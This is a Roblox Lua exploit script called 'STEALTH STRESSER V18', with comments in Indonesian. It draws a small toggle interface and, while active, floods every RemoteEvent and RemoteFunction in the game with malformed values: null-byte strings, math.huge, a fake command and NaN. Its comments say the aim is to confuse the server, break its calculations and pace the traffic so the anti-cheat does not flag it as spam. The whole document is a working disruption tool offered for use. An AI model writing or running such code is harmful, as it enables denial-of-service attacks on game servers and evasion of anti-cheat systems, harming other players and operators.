local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- UI Cleanup
if CoreGui:FindFirstChild("Ikyy_Stealth_V18") then CoreGui:FindFirstChild("Ikyy_Stealth_V18"):Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Ikyy_Stealth_V18"
ScreenGui.Parent = CoreGui

-- UI Design (Sleek Cyan - Stealth Look)
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 240, 0, 160)
Main.Position = UDim2.new(0.5, -120, 0.5, -80)
Main.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Main.Parent = ScreenGui
local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 12) Corner.Parent = Main
local Stroke = Instance.new("UIStroke") Stroke.Thickness = 2 Stroke.Color = Color3.fromRGB(0, 255, 200) Stroke.Parent = Main

local Title = Instance.new("TextLabel")
Title.Text = "STEALTH STRESSER V18"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(0, 255, 200)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1
Title.Parent = Main

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 180, 0, 50)
ToggleBtn.Position = UDim2.new(0.5, -90, 0.5, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
ToggleBtn.Text = "ENGINE: STANDBY"
ToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 12
ToggleBtn.Parent = Main
local BCorner = Instance.new("UICorner") BCorner.CornerRadius = UDim.new(0, 10) BCorner.Parent = ToggleBtn

-- LOGIKA STEALTH (ANTI-KICK BYPASS)
local IsRunning = false
local Payloads = {
    [1] = string.rep("\0", 500), -- Null bytes (Ringan tapi bingungkan server)
    [2] = {["Data"] = math.huge, ["Target"] = "All"}, -- Table stress
    [3] = "GetServerData", -- Perintah palsu
    [4] = 0/0 -- NaN (Not a Number) untuk merusak kalkulasi
}

local function ExecuteStealth()
    while IsRunning do
        -- Gunakan spawn agar tidak membeku (Client-side stability)
        task.spawn(function()
            -- Scan hanya Remote yang relevan agar tidak boros bandwidth
            for _, r in pairs(game:GetDescendants()) do
                if not IsRunning then break end
                if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
                    pcall(function()
                        -- Mengirim 5 paket cepat per remote (Bukan ribuan sekaligus)
                        for i = 1, 5 do
                            local p = Payloads[math.random(1, #Payloads)]
                            if r:IsA("RemoteEvent") then
                                r:FireServer(p, p)
                            else
                                task.spawn(function() r:InvokeServer(p) end)
                            end
                        end
                    end)
                end
            end
        end)
        -- Jeda dinamis agar tidak dianggap 'Packet Spam' oleh Anti-Cheat
        task.wait(0.2) 
    end
end

ToggleBtn.MouseButton1Click:Connect(function()
    IsRunning = not IsRunning
    if IsRunning then
        ToggleBtn.Text = "ENGINE: ACTIVE"
        ToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(0, 40, 30)
        task.spawn(ExecuteStealth)
    else
        ToggleBtn.Text = "ENGINE: STANDBY"
        ToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    end
end)

-- Draggable Logic
local d, di, ds, sp
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = Main.Position end end)
Main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds Main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
